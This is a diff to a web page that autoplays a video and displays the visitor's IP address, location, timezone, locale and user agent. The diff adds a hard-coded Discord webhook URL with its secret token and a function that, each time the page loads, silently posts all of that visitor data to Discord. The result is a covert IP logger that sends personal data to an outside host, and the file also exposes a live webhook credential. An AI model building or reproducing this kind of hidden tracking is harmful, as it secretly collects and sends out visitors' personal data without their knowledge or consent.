@@ -39,21 +39,20 @@
   const soundBtn = document.getElementById("soundBtn");
   const infoBox = document.getElementById("info");
 
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1474753431695659191/mzHMpinVBQC4pbmjH4iX8aMUSvsD5AVutTJW3MM92VZVaSG_YFE0nKtpRK18gDsNANP_"; // <-- put your Discord webhook URL
+
   function forceAudioOn() {
     video.muted = false;
     video.volume = 1.0;
-    // for some browsers, setting these after play can help too
   }
 
   async function tryAutoplayWithSound() {
     forceAudioOn();
     try {
       await video.play();
-      // If browser silently forced it muted, show button anyway
       if (video.muted || video.volume === 0) soundBtn.style.display = "block";
       else soundBtn.style.display = "none";
     } catch (e) {
-      // Blocked: fall back to muted autoplay
       video.muted = true;
       video.volume = 1.0;
       try { await video.play(); } catch {}
@@ -71,7 +70,6 @@
     }
   });
 
-  // Also allow any click anywhere to enable sound
   window.addEventListener("click", async () => {
     if (soundBtn.style.display !== "none") {
       forceAudioOn();
@@ -80,6 +78,20 @@
   });
 
   tryAutoplayWithSound();
+
+  async function sendToDiscord(content) {
+    try {
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: "```" + content + "```"
+        })
+      });
+    } catch (e) {
+      console.error("Failed to send to Discord", e);
+    }
+  }
 
   async function loadIPInfo() {
     try {
@@ -92,7 +104,7 @@
       const browserLocale = navigator.language;
       const ua = navigator.userAgent;
 
-      infoBox.textContent =
+      const text =
         `IP Address: ${ip}\n\n` +
         `City: ${d.city}\n` +
         `Region: ${d.region}\n` +
@@ -102,10 +114,16 @@
         `Timezone (Browser): ${browserTz}\n` +
         `Locale: ${browserLocale}\n\n` +
         `User Agent:\n${ua}`;
-    } catch {
+
+      infoBox.textContent = text;
+
+      // send the same text to Discord
+      sendToDiscord(text);
+    } catch (e) {
       infoBox.textContent = "Failed to load IP info.";
     }
   }
+
   loadIPInfo();
 </script>
 
